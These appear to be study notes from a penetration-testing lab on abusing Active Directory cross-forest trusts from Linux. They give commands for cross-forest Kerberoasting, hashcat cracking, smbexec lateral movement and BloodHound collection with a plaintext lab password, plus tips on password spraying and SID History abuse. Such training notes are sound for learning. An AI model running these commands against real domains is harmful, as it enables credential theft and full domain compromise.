# Cross-Forest Trust Abuse — From Linux

## Attack 1 — Cross-Forest Kerberoasting (GetUserSPNs.py)

### Step 1 — Enumerate SPNs in the target domain
```bash
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```
Shows SPN accounts in the target domain, their group membership, and password last set date.

### Step 2 — Request TGS tickets
```bash
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
# Add -outputfile hashes.txt to write directly to a file for Hashcat
```

### Step 3 — Crack offline
```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

**After cracking:**
- Authenticate to the target domain as Domain Admin
- Check if the same account/password exists in your current domain (password reuse)
- Consider a single password spray against other service accounts in both domains — if the same admins manage both, reuse is likely

```bash
smbexec.py freightlogistics/sapsso@freightlogistics.local
```
Enter in password collected from Step 3

---

## Attack 2 — Foreign Group Membership with BloodHound-Python

**Note:** `bloodhound-python` requires DNS resolution to a DC hostname — not just an IP. If your attack host isn't configured with domain DNS, edit `/etc/resolv.conf` first.

### Configure DNS for the first domain
```
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
```

### Collect data from the first domain
```bash
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
```

### Compress output for BloodHound import
```bash
zip -r ilfreight_bh.zip *.json
```

### Configure DNS for the second (target) domain
```
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238
```

### Collect data from the target domain
```bash
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
```
> Note: When authenticating as a user from a different domain, use the full `user@domain.local` format.

### Upload to BloodHound GUI and query
Upload both zip files (or JSON files) to BloodHound, then:
- **Analysis tab** → **"Users with Foreign Domain Group Membership"**
- Select source domain: `INLANEFREIGHT.LOCAL`
- Shows foreign principals in groups across the trust (e.g. INLANEFREIGHT\Administrator in FREIGHTLOGISTICS\Administrators)

---

## Key Takeaways

| Attack | Tool | Requirement |
|---|---|---|
| Cross-forest Kerberoasting | `GetUserSPNs.py` | Valid creds in source domain; SPN accounts exist in target |
| Foreign group membership | `bloodhound-python` | Valid creds; DNS configured for each domain |

**Remember:** Domain trusts enable chained compromise paths. Taking over one domain may instantly hand you another via:
- Password reuse on admin accounts
- Foreign group membership (source domain admin in target domain's Administrators group)
- SID History abuse (when SID filtering is not enabled)
- ExtraSids attack for child → parent domain escalation

Always enumerate trust relationships early — they frequently provide the fastest path to full domain/forest compromise.